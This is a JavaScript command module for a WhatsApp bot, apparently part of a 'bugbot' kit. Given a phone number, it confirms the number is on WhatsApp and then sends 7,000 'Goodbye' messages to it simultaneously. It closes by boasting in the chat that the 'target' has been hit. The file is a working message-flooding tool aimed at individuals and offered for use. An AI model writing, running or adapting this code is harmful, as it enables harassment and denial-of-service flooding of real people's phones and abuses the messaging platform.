const { channelInfo } = require('../lib/messageConfig');

async function sulexhCommand(sock, chatId, message) {

try {

const text =
message.message?.conversation ||
message.message?.extendedTextMessage?.text ||
"";

const args = text.trim().split(/\s+/);
const number = args[1];

if (!number) {
await sock.sendMessage(chatId, {
text: "Example: .sulexh 254xxxxxxxx",
...channelInfo
}, { quoted: message });
return;
}

const cleanNumber = number.replace(/[^0-9]/g, '');
const jid = cleanNumber + "@s.whatsapp.net";

try {

// check if number exists on WhatsApp
const [result] = await sock.onWhatsApp(jid);

if (!result?.exists) {
await sock.sendMessage(chatId, {
text: "❌ Number is not on WhatsApp",
...channelInfo
}, { quoted: message });
return;
}

// create 20 send tasks instantly
const tasks = Array.from({ length: 7000 }, () =>
sock.sendMessage(jid, { text: "Goodbye" }).catch(() => {})
);

// send them all at once
await Promise.allSettled(tasks);

// confirmation message
await sock.sendMessage(chatId, {
text: "✅ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐅𝐔𝐂𝐊𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐁𝐘 𝐁𝐔𝐆𝐁𝐎𝐓 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐁𝐔𝐆𝐅𝐈𝐗𝐄𝐃 𝐒𝐔𝐋𝐄𝐗𝐇 𝐓𝐄𝐂𝐇☠️☠️☠️☠️☠️🚮🚮🚮",
...channelInfo
}, { quoted: message });

} catch (err) {

console.log("SULEXH send error:", err);

await sock.sendMessage(chatId, {
text: "⚠️ Failed to send messages",
...channelInfo
}, { quoted: message });

}

} catch (err) {

console.log("SULEXH command error:", err);

await sock.sendMessage(chatId, {
text: "⚠️ Command failed",
...channelInfo
}, { quoted: message });

}

}

module.exports = sulexhCommand;
